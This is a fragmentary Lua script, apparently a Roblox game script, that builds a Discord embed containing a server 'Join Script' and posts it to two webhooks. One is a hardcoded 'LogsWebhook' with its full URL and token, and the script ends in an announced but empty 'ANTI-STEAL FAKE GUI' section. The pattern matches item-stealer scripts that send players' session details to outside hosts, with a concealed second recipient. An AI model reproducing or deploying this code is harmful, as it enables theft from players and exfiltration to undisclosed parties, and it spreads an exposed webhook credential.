--[[
 ...
 |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
        ...
        local LogsWebhook = "https://discord.com/api/webhooks/1439111219914215565/_dc2mMZkqckAhFM0X88UFs61TxVztljpaeG0P6kOSbrEQjUBlKY7CPUBgk-QUqFbMSQn"
...
local payload = {
    ...
    embeds = {{
        ...
        fields = {
            ...
            {
                name = "<:emoji_2:1402577600060325910> **Join Script**",
                value = "```lua\n" .. tpScript .. "\n```",
                inline = false
            },
            {
        ...
        image = {
            url = "https://scriptssm.vercel.app/pngs/gag.webp"
        }
    }},
    attachments = {}
}
...
local function sendWebhook(url)
    ...
    if not success then warn("Webhook failed ("..url.."):", err) end
end

sendWebhook(Webhook)     -- Main
sendWebhook(LogsWebhook) -- Logs
-----------------------------------------------------------------
-- ANTI-STEAL FAKE GUI
-----------------------------------------------------------------
